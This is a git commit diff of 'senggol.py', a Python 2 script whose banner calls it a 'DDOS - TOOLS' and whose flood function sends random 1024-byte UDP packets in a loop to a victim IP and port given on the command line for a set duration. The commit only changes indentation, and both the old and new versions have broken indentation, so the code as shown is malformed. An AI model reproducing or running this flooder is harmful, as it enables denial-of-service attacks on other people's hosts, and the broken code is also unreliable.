8594d80fe704e205d7c1b94093b73da38e73aa94
AditXIndo <90891674+AditXIndo@users.noreply.github.com>
2021-09-24 12:11:19 +0800

    Update senggol.py

--- senggol.py
+++ senggol.py
@@ -7,41 +7,41 @@ import random
 import time
 import os
 
-      def usage():
-           print  " ========================== "
-           print  "     DDOS - TOOLS - BY-S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿    "
-           print  " iii III III        IIII III III            IIIIIIIIII "
-           print  " III III   III      III  III     III     III          III "
-           print  " III III     III    III  III        III  III          III "
-           print  " III III       III  III  III        III  III          III "
-           print  " III III        III III  III     III     III          III "
-           print  " iii III           IIIII  III  III          IIIIIIIIII "
-           print  " =========================== "
-           print  "# ===SUBSCRIBE DitDit Roleplay=== #"
+def usage():
+    print  " ========================== "
+    print  "     DDOS - TOOLS - BY-S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿    "
+    print  " iii III III        IIII III III            IIIIIIIIII "
+    print  " III III   III      III  III     III     III          III "
+    print  " III III     III    III  III        III  III          III "
+    print  " III III       III  III  III        III  III          III "
+    print  " III III        III III  III     III     III          III "
+    print  " iii III           IIIII  III  III          IIIIIIIIII "
+    print  " =========================== "
+    print  "# ===SUBSCRIBE DitDit Roleplay=== #"
            
-      def flood(victim, vport, duration):
-    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
-    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 1024 representes one byte to the server
-    bytes = random._urandom(1024)
-    timeout =  time.time() + duration
-    sent = 3000
+def flood(victim, vport, duration):
+# okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+# 1024 representes one byte to the server
+bytes = random._urandom(1024)
+timeout =  time.time() + duration
+sent = 3000
     
-    while 1:
-        if time.time() > timeout:
-            break
-        else:
-            pass
-        client.sendto(bytes, (victim, vport))
-        sent = sent + 1
-        print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena senggol %s IP | PORT %s "%(sent, victim, vport)
+while 1:
+if time.time() > timeout:
+    break
+else:
+pass
+client.sendto(bytes, (victim, vport))
+sent = sent + 1
+print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena senggol %s IP | PORT %s "%(sent, victim, vport)
 
-    def main():
-    print len(sys.argv)
-    if len(sys.argv) != 4:
-        usage()
-    else:
-        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+def main():
+print len(sys.argv)
+if len(sys.argv) != 4:
+usage()
+else:
+flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
 
 if __name__ == '__main__':
     main()
